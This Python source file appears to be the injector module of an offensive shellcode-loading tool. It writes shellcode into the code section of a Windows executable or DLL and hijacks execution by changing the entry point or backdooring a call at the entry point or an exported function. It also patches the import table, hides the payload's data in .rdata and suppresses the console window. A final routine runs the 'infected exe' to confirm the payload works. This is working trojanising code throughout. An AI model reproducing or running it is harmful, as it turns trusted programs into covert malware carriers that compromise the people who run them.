from helper import *
import logging
import time
import logging
from typing import Dict, List

from model.carrier import Carrier, DataReuseEntry
from pe.pehelper import *
from observer import observer
from pe.derbackdoorer import FunctionBackdoorer
from pe.superpe import SuperPe
from model.project import Project
from model.settings import Settings
from pe.asmdisasm import *
from model.defs import *

logger = logging.getLogger("Injector")


def inject_exe(main_shc: bytes, settings: Settings, carrier: Carrier):
    exe_in = settings.inject_exe_in
    exe_out = settings.inject_exe_out
    carrier_invoke_style: CarrierInvokeStyle = settings.carrier_invoke_style

    logger.info("--[ Injecting: into {} -> {}".format(exe_in, exe_out))

    # CHECK if shellcode fits into the target code section
    shellcode_len = len(main_shc)
    code_sect_size = carrier.superpe.get_code_section().Misc_VirtualSize
    if shellcode_len + CODE_INJECT_SIZE_CHECK_ADD > code_sect_size:
        raise Exception("Error: Shellcode size {}+{} too big for target code section {}".format(
            shellcode_len, CODE_INJECT_SIZE_CHECK_ADD, code_sect_size
        ))

    # superpe is a representation of the exe file. We gonna modify it, and save it at the end.
    superpe = SuperPe(exe_in)
    function_backdoorer = FunctionBackdoorer(superpe)

    # Patch IAT (if necessary and wanted)
    for iatRequest in carrier.get_all_iat_requests():
        # skip available
        addr = superpe.get_vaddr_of_iatentry(iatRequest.name)
        if addr != None:
            logger.info("    IAT {} is at: 0x{:X}".format(iatRequest.name, addr))
            continue
        iat_name = superpe.get_replacement_iat_for("KERNEL32.dll", iatRequest.name)

        if not settings.fix_missing_iat:
            raise Exception("Error: {} not available, but fix_missing_iat is False".format(
                iatRequest.name
            ))
        # do the patch
        superpe.patch_iat_entry("KERNEL32.dll", iat_name, iatRequest.name)

    # we modify the IAT raw, so reparsing is required
    superpe.pe.parse_data_directories()
    superpe.init_iat_entries()

    shellcode_offset: int = 0  # file offset

    # Special case: DLL exported function direct overwrite
    if superpe.is_dll() and settings.dllfunc != "" and carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
        logger.warning("---[ Inject DLL: Overwrite exported function {} with shellcode".format(settings.dllfunc))
        rva = superpe.getExportEntryPoint(settings.dllfunc)

        # Size and sanity checks
        function_size = superpe.get_size_of_exported_function(settings.dllfunc)
        if shellcode_len >= function_size:
            logger.warning("Shellcode larger than function: {} > {} exported function {}".format(
                shellcode_len, function_size, settings.dllfunc
            ))

        # Inject
        shellcode_offset = superpe.get_offset_from_rva(rva)
        logger.info(f'----[ Using DLL Export "{settings.dllfunc}" at RVA 0x{rva:X} offset 0x{shellcode_offset:X} to overwrite')
        superpe.pe.set_bytes_at_offset(shellcode_offset, main_shc)

    else:  # EXE/DLL
        # Put it somewhere in the code section, and rewire the flow
        sect = superpe.get_code_section()
        if sect == None:
            raise Exception('Could not find code section in input PE file!')
        sect_size = sect.Misc_VirtualSize  # Better than: SizeOfRawData
        if sect_size < shellcode_len + CODE_INJECT_SIZE_CHECK_ADD:
            raise Exception("Shellcode too large: {}+{} > {}".format(
                shellcode_len, CODE_INJECT_SIZE_CHECK_ADD, sect_size
            ))
        shellcode_offset = int((sect_size - shellcode_len) / 2)  # centered in the .text section
        #shellcode_offset = round_up_to_multiple_of_8(shellcode_offset)
        shellcode_offset += sect.PointerToRawData
        shellcode_rva = superpe.pe.get_rva_from_offset(shellcode_offset)

        logger.info("---( Inject: Write Shellcode to offset:0x{:X} (rva:0x{:X})".format(
            shellcode_offset, shellcode_rva))

        # Copy the shellcode
        superpe.pe.set_bytes_at_offset(shellcode_offset, main_shc)

        # rewire flow
        if superpe.is_dll() and settings.dllfunc != "":  # DLL
            if carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
                # Handled above
                raise Exception("We should not land here")

            elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
                addr = superpe.getExportEntryPoint(settings.dllfunc)
                logger.info("---( Inject DLL: Backdoor {} (0x{:X})".format(
                    settings.dllfunc, addr))
                function_backdoorer.backdoor_function(addr, shellcode_rva, shellcode_len)

        else: # EXE
            if carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
                logger.info("---( Inject EXE: Change Entry Point to 0x{:X}".format(
                    shellcode_rva))
                superpe.set_entrypoint(shellcode_rva)

            elif carrier_invoke_style == CarrierInvokeStyle.BackdoorCallInstr:
                addr = superpe.get_entrypoint()
                logger.info("---( Inject EXE: Backdoor function at entrypoint (0x{:X})".format(
                    addr))
                function_backdoorer.backdoor_function(addr, shellcode_rva, shellcode_len)

    logger.info("--( Fix shellcode to re-use IAT entries")
    injected_fix_iat(superpe, carrier)
    logger.info("--( Fix shellcode to reference data stored in .rdata")
    injected_fix_data(superpe, carrier)

    # changes from console to UI (no console window) if necessary
    superpe.patch_subsystem()

    # We done
    logger.info("--( Write to file: {}".format(exe_out))
    superpe.write_pe_to_file(exe_out)

    # Log
    code = file_readall_binary(exe_out)
    in_code = code[shellcode_offset:shellcode_offset+shellcode_len]
    observer.add_code_file("carrier_exe", in_code)


def injected_fix_iat(superpe: SuperPe, carrier: Carrier):
    """replace IAT-placeholders in shellcode with call's to the IAT"""
    code = superpe.get_code_section_data()
    for iatRequest in carrier.get_all_iat_requests():
        if not iatRequest.placeholder in code:
            raise Exception("IatResolve ID {} not found, abort".format(iatRequest.placeholder))
        offset_from_code = code.index(iatRequest.placeholder)
        
        # Note that the SuperPe may already have been patched for new IAT imports
        destination_virtual_address = superpe.get_vaddr_of_iatentry(iatRequest.name)
        if destination_virtual_address == None:
            raise Exception("IatResolve: Function {} not found".format(iatRequest.name))
        
        instruction_virtual_address = offset_from_code + carrier.superpe.get_image_base() + carrier.superpe.get_code_section().VirtualAddress
        logger.info("      Replace {} at VA 0x{:X} with: call to IAT at VA 0x{:X}".format(
            iatRequest.placeholder.hex(), instruction_virtual_address, destination_virtual_address
        ))
        jmp = assemble_relative_call(instruction_virtual_address, destination_virtual_address)
        if len(jmp) != len(iatRequest.placeholder):
            raise Exception("IatResolve: Call to IAT has different length than placeholder, abort")
        code = code.replace(iatRequest.placeholder, jmp)

    superpe.write_code_section_data(code)


def injected_fix_data(superpe: SuperPe, carrier: Carrier):
    """Inject shellcode-data into .rdata and replace reusedata_fixup placeholders in code with LEA"""
    # Insert my data into the .rdata section.
    # Chose and save each datareuse_fixup's addres.
    reusedata_fixups: List[DataReuseEntry] = carrier.get_all_reusedata_fixups()
    if len(reusedata_fixups) == 0:
        # nothing todo
        return
    
    # Put stuff into .rdata section in the PE
    peSection = carrier.superpe.get_section_by_name(".rdata")
    if peSection == None:
        raise Exception("No .rdata section found, abort")
    
    rm = carrier.superpe.get_rdata_relocmanager()

    if True:  # FIXME this is a hack which is sometimes necessary
        sect_data_copy = peSection.pefile_section.get_data()
        string_off = find_first_utf16_string_offset(sect_data_copy)
        if string_off == None:
            raise Exception("Strings not found in .rdata section, abort")
        if string_off < 128:
            logging.debug("weird: Strings in .rdata section at offset {} < 100".format(string_off))
            string_off = 128
        rm.add_range(peSection.virt_addr, peSection.virt_addr + string_off)

    # Do all .rdata patches
    logger.info("---( Patch: .rdata")
    for datareuse_fixup in reusedata_fixups:
        logger.info("     Handling DataReuse Fixup: {} <- {}".format(
            datareuse_fixup.string_ref, datareuse_fixup.randbytes.hex()))

        # get a hole in the .rdata section to put our data
        hole_rva = rm.find_hole(len(datareuse_fixup.data))
        if hole_rva == None:
            raise Exception("No suitable hole with size {} found in .rdata section, abort".format(
                len(datareuse_fixup.data)
            ))
        rm.add_range(hole_rva[0], hole_rva[1]+1)  # mark it as used

        var_data = datareuse_fixup.data
        data_rva = hole_rva[0]
        superpe.pe.set_bytes_at_rva(data_rva, var_data)
        datareuse_fixup.addr = data_rva + carrier.superpe.get_image_base()
        logging.info("       Add to .rdata at 0x{:X} ({}): {}: {}".format(
            datareuse_fixup.addr, data_rva, datareuse_fixup.string_ref, ui_string_decode(var_data)))

    # patch code section
    # replace the placeholder with a LEA instruction to the data we written above
    logger.info("---( Patch: .text")
    code = superpe.get_code_section_data()
    for datareuse_fixup in reusedata_fixups:
        if not datareuse_fixup.randbytes in code:
            raise Exception("fix data in injectable: DataReuse: ID {} ({}) not found in code section, abort".format(
                datareuse_fixup.randbytes.hex(), datareuse_fixup.string_ref))
        
        offset_from_datasection = code.index(datareuse_fixup.randbytes)
        instruction_virtual_address = offset_from_datasection + carrier.superpe.get_image_base() + carrier.superpe.get_code_section().VirtualAddress
        destination_virtual_address = datareuse_fixup.addr
        logger.info("       Replace bytes {} at VA 0x{:X} with: LEA {} .rdata 0x{:X}".format(
            datareuse_fixup.randbytes.hex(), instruction_virtual_address, datareuse_fixup.register, destination_virtual_address
        ))
        lea = assemble_lea(
            instruction_virtual_address, destination_virtual_address, datareuse_fixup.register
        )
        asm_disasm(lea, instruction_virtual_address)  # DEBUG
        if len(lea) != len(datareuse_fixup.randbytes):
            raise Exception("IatResolve: Call to IAT has different length than placeholder, abort")
        code = code.replace(datareuse_fixup.randbytes, lea)

    superpe.write_code_section_data(code)


def verify_injected_exe(exefile: FilePath, dllfunc="") -> int:
    logger.info("---[ Verify infected exe: {} ".format(exefile))
    # remove indicator file
    pathlib.Path(VerifyFilename).unlink(missing_ok=True)

    run_exe(exefile, dllfunc=dllfunc, check=False)
    time.sleep(SHC_VERIFY_SLEEP)
    if os.path.isfile(VerifyFilename):
        logger.info("---> Verify OK. Infected exe works (file was created)")
        # better to remove it immediately
        os.remove(VerifyFilename)
        return 0
    else:
        logger.error("---> Verify FAIL. Infected exe does not work (no file created)")
        return 1


